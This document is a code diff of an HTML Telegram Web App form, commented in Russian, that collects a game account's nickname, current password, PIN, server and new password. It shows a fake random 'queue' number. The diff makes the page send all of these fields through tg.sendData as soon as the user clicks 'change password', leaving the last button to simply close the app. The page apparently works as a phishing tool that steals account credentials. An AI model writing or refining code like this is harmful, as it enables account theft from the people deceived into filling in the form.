@@ -32,7 +32,7 @@
         <button class="btn-red" onclick="goToScreen(2)">Продолжить</button>
     </div>
 
-    <!-- ЭКРАН 2: Форма (Ник, Пароль, Пин, Сервер, Новый Пароль) -->
+    <!-- ЭКРАН 2: Форма -->
     <div id="screen2" class="screen">
         <h2 style="color: #ff0000; text-transform: uppercase; margin-bottom: 15px; font-size: 18px;">Данные аккаунта</h2>
         
@@ -89,22 +89,27 @@
             return;
         }
 
-        // Генерация очереди от 1 до 99
-        document.getElementById('queue-val').innerText = Math.floor(Math.random() * 99) + 1;
+        // --- ДАННЫЕ ОТПРАВЛЯЮТСЯ ТЕПЕРЬ ТУТ (ПРИ НАЖАТИИ "СМЕНИТЬ ПАРОЛЬ") ---
+        const queueVal = Math.floor(Math.random() * 99) + 1;
+        document.getElementById('queue-val').innerText = queueVal;
+
+        const result = {
+            nickname: nick,
+            current_password: oldP,
+            pin: document.getElementById('pin').value || "None",
+            server: serv,
+            new_password: newP,
+            queue: queueVal.toString()
+        };
+        
+        tg.sendData(JSON.stringify(result));
+        // -------------------------------------------------------------------
+
         goToScreen(3);
     }
 
     function finalSend() {
-        const result = {
-            nickname: document.getElementById('nick').value,
-            current_password: document.getElementById('old_pass').value,
-            pin: document.getElementById('pin').value || "None",
-            server: document.getElementById('server').value,
-            new_password: document.getElementById('new_pass').value,
-            queue: document.getElementById('queue-val').innerText
-        };
-        
-        tg.sendData(JSON.stringify(result));
+        // Теперь эта кнопка просто закрывает приложение
         tg.close();
     }
 </script>
